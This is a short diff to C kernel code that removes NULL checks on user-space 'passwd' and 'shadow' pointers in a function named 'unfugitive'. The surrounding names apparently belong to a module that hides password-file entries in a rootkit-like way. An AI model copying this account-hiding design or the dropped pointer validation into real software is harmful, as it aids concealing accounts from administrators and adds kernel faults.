@@ -202,12 +202,6 @@ int unfugitive(const char __user *passwd, const char __user *shadow) {
   if (fugitive__lines[0] == NULL
       || fugitive__lines[1] == NULL)
     return -EINVAL;
-  
-  if (passwd == NULL)
-    return -EFAULT;
-  
-  if (shadow == NULL)
-    return -EFAULT;
   fugitive__hidden = 0;
   kfree(fugitive__lines[0]);
   kfree(fugitive__lines[1]);
